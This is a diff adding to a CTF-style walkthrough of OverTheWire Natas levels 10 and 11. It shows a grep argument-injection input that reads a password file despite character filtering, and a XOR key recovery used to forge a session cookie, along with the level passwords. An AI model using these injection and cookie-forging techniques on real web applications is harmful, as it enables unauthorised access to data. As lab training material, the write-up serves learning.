@@ -177,12 +177,90 @@ References
 - https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)
 - https://github.com/PortSwigger/command-injection-attacker
 
-### Level 10 -
+### Level 10 - Shell injection with forbidden characters
 ```
 http://natas10.natas.labs.overthewire.org/ natas10 nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
 ```
-``
+Now characters `;` `|` and `&` are filtered via a regex. We need to get creative. `grep` can look into multiple files:
+```bash
+grep -i pattern file1 file2
+# so as we have file=dictionary.txt:
+grep -i $key dictionary.txt
+# we can set $key to have to pattern="any letter" AND file1=/etc/natas_webpass/natas10
+grep -i -e [a-z] /etc/natas_webpass/natas11 dictionary.txt # -e [a-z] is a regex matching any lowercase letter
+```
+So with the input `-e [a-z] /etc/natas_webpass/natas11` we get
+```
+Output:
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+```
 
+> This method works also for the previous challenge
+
+### Level 11 - XOR encryption
+```
+http://natas11.natas.labs.overthewire.org/ natas11 U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+```
+Check your Cookies and find `Set-Cookie: data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=`.
+
+This is an base64-encoded JSON object from the PHP array
+```php
+[
+  "showpassword"=>"no",
+  "bgcolor"=>"#ffffff"
+]
+```
+
+As we have the base value and the final value, the XOR can be reversed to find the key. Copy/paste the `xor_encrypt` function and replace `$key` by the base64-decoded value of the cookie:
+```bash
+$ vim natas11.php
+```
+```php
+function xor_encrypt($in) {
+  $key = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');
+  $text = $in;
+  $outText = '';
+  // Iterate through each character
+  for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+  }
+  return $outText;
+}
+$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
+echo xor_encrypt(json_encode($defaultdata));
+```
+```bash
+$ php -f natas11.php
+qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+```
+
+Here's the key: `qw8J`! We can now replace it in the default algorithm, and change `"showpassword"=>"yes"`:
+```php
+function xor_encrypt($in) {
+  $key = 'qw8J';
+  $text = $in;
+  $outText = '';
+  // Iterate through each character
+  for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+  }
+  return $outText;
+}
+$defaultdata = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
+echo xor_encrypt(json_encode($defaultdata));
+```
+```bash
+$ php -f xor.php
+ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+```
+Update your `data` cookie value and refresh the page to get the password:
+`EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`
+
+### Level 12 -
+```
+http://natas12.natas.labs.overthewire.org/ natas12 EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+```
+``
 
 ### Level  -
 ```
